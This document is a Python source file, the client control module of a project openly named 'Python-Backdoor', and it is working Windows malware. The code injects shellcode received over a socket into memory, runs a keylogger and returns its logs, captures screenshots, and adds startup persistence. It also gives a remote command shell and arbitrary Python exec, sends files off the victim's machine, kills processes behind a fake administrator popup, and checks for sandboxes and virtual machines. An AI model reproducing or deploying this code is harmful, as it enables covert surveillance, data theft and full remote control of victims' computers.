"""
https://github.com/xp4xbox/Python-Backdoor

@author    xp4xbox

license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
"""
import ctypes
import os
import socket
import subprocess
import sys
import threading
import platform
import time
from io import BytesIO, StringIO

import pyscreeze
import pythoncom
import wmi

from src import helper, errors
from src.client import persistence
from src.command_defs import *
from src.client.keylogger import Keylogger


def message_box(message, title, values):
    threading.Thread(target=lambda: ctypes.windll.user32.MessageBoxW(0, message, title, values)).start()


def lock():
    ctypes.windll.user32.LockWorkStation()


def get_info():
    _hostname = socket.gethostname()
    _platform = f"{platform.system()} {platform.release()}"
    _platform += " (Sandboxie) " if persistence.detect_sandboxie() else ""
    _platform += " (Virtual Machine) " if persistence.detect_vm() else ""

    info = {"username": os.environ["USERNAME"], "hostname": _hostname, "platform": _platform,
            "is_admin": bool(ctypes.windll.shell32.IsUserAnAdmin()), "architecture": platform.architecture(),
            "machine": platform.machine(), "processor": platform.processor(),
            "x64_python": ctypes.sizeof(ctypes.c_voidp) == 8}

    return info


class Control:
    def __init__(self, socket):
        self.socket = socket
        self.keylogger = Keylogger()
        self.disabled_processes = {}

    # tested on x86 and x64, shellcode must be generated using the same architecture as python interpreter
    # x64 fix from https://stackoverflow.com/questions/60198918/virtualalloc-and-python-access-violation/61258392#61258392
    def inject_shellcode(self, buffer):
        shellcode = self.socket.recvall(buffer)

        pid = os.getpid()

        try:
            shellcode = bytearray(shellcode.decode('unicode-escape').encode('ISO-8859-1'))

            h_process = ctypes.windll.kernel32.OpenProcess(0x001F0FFF, False, int(pid))

            if not h_process:
                raise Exception(f"Could not acquire pid on {pid}")

            ctypes.windll.kernel32.VirtualAllocEx.restype = ctypes.c_void_p
            ctypes.windll.kernel32.RtlMoveMemory.argtypes = (ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t)
            ctypes.windll.kernel32.CreateThread.argtypes = \
                (ctypes.c_int, ctypes.c_int, ctypes.c_void_p, ctypes.c_int, ctypes.c_int,
                 ctypes.POINTER(ctypes.c_int))

            ptr = ctypes.windll.kernel32.VirtualAllocEx(h_process, 0, ctypes.c_int(len(shellcode)),
                                                        ctypes.c_int(0x3000),
                                                        ctypes.c_int(0x40))

            buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

            ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_void_p(ptr), buf, ctypes.c_size_t(len(shellcode)))

            ctypes.windll.kernel32.CreateThread(ctypes.c_int(0), ctypes.c_int(0), ptr, ctypes.c_int(0),
                                                ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))

            # wait a few seconds to see if client crashes
            time.sleep(3)

        except Exception as e:
            self.socket.send_json(ERROR, f"Error injecting shellcode {e}")
        else:
            self.socket.send_json(SUCCESS)

    def toggle_disable_process(self, process, popup):
        process = process.lower()

        if process in self.disabled_processes.keys() and self.disabled_processes.get(process):
            self.disabled_processes[process] = False
            self.socket.send_json(SUCCESS, f"process {process} re-enabled")
            return
        else:
            self.disabled_processes[process] = True
            self.socket.send_json(SUCCESS, f"process {process} disabled")

        # kill process if its running
        subprocess.Popen(["taskkill", "/f", "/im", process], stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                         stdin=subprocess.PIPE, shell=True)

        def block_process():
            pythoncom.CoInitialize()

            c = wmi.WMI(moniker="winmgmts:{impersonationLevel=impersonate}!//./root/cimv2")

            watcher = c.watch_for(raw_wql="SELECT * from __instancecreationevent within 1 WHERE TargetInstance isa "
                                          "'Win32_Process'")

            while True:
                process_wmi = watcher()

                if not self.disabled_processes.get(process):
                    break

                if process_wmi.Name.lower() == process:
                    process_wmi.Terminate()

                    if popup:
                        message_box(f"{process} has been disabled by your administrator", title=process,
                                    values=0x0 | 0x10 | 0x40000)

        threading.Thread(target=block_process, daemon=True).start()

    def add_startup(self, remove=False):
        try:
            if remove:
                persistence.remove_from_startup()
            else:
                persistence.add_startup()

            self.socket.send_json(SUCCESS)
        except errors.ClientSocket.Persistence.StartupError as e:
            self.socket.send_json(ERROR, str(e))

    def close(self):
        self.socket.close()
        sys.exit(0)

    def keylogger_dump(self):
        try:
            self.socket.sendall_json(SUCCESS, helper.decode(self.keylogger.dump_logs().encode()))
        except errors.ClientSocket.KeyloggerError as e:
            self.socket.send_json(ERROR, str(e))

    def keylogger_start(self):
        self.keylogger.start()

    def keylogger_stop(self):
        try:
            self.keylogger.stop()
            self.socket.send_json(SUCCESS)
        except errors.ClientSocket.KeyloggerError as e:
            self.socket.send_json(ERROR, str(e))

    def screenshot(self):
        image = pyscreeze.screenshot()
        with BytesIO() as _bytes:
            image.save(_bytes, format="PNG")
            image_bytes = _bytes.getvalue()

        self.socket.sendall_json(SERVER_SCREENSHOT, image_bytes, len(image_bytes), is_bytes=True)

    def shutdown(self, shutdown_type, timeout):
        command = f"shutdown {shutdown_type} -f -t {str(timeout)}"
        subprocess.Popen(command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,
                         shell=True)
        self.socket.close()
        sys.exit(0)

    def run_command(self, command):
        _command = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,
                                    shell=True)
        output = _command.stdout.read() + _command.stderr.read()

        self.socket.sendall_json(SUCCESS, helper.decode(output))

    def command_shell(self):
        current_dir = os.getcwd()

        self.socket.send_json(SERVER_SHELL_DIR, current_dir)

        while True:
            data = self.socket.recv_json()

            if data["key"] == CLIENT_SHELL_CMD:
                command_request = data["value"]

                if command_request[:2].lower() == "cd" or command_request[:5].lower() == "chdir":
                    command = subprocess.Popen(f"{command_request} & cd", stdout=subprocess.PIPE,
                                               stderr=subprocess.PIPE,
                                               stdin=subprocess.PIPE, shell=True)

                    if command.stderr.read().decode() == "":  # if there is no error
                        output = (command.stdout.read()).decode().splitlines()[0]  # decode and remove new line
                        os.chdir(output)  # change directory

                        self.socket.send_json(SERVER_SHELL_DIR, os.getcwd())
                else:
                    command = subprocess.Popen(command_request, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                               stdin=subprocess.PIPE,
                                               shell=True)
                    output = command.stdout.read() + command.stderr.read()

                    self.socket.sendall_json(SERVER_COMMAND_RSP, helper.decode(output))

            elif data["key"] == CLIENT_SHELL_LEAVE:
                os.chdir(current_dir)  # change directory back to original
                break

    def upload(self, buffer, file_path):
        output = self.socket.recvall(buffer)

        try:
            with open(file_path, "wb") as file:
                file.write(output)

            self.socket.send_json(SUCCESS, f"Total bytes received by client: {len(output)}")
        except Exception as e:
            self.socket.send_json(ERROR, f"Could not open file {e}")

    def receive(self, file):
        try:
            with open(file, "rb") as _file:
                data = _file.read()

            self.socket.sendall_json(SERVER_FILE_RECV, data, len(data), is_bytes=True)
        except Exception as e:
            self.socket.send_json(ERROR, f"Error reading file {e}")

    def python_interpreter(self):
        while True:
            command = self.socket.recv_json()

            if command["key"] == CLIENT_PYTHON_INTERPRETER_CMD:
                old_stdout = sys.stdout
                redirected_output = sys.stdout = StringIO()

                try:
                    exec(command["value"])
                    print()
                    error = None
                except Exception as e:
                    error = f"{e.__class__.__name__}: "
                    try:
                        error += f"{e.args[0]}"
                    except:
                        pass
                finally:
                    sys.stdout = old_stdout

                if error:
                    self.socket.sendall_json(SERVER_PYTHON_INTERPRETER_RSP, helper.decode(error.encode()))
                else:
                    self.socket.sendall_json(SERVER_PYTHON_INTERPRETER_RSP,
                                             helper.decode(redirected_output.getvalue().encode()))
            elif command["key"] == CLIENT_PYTHON_INTERPRETER_LEAVE:
                break
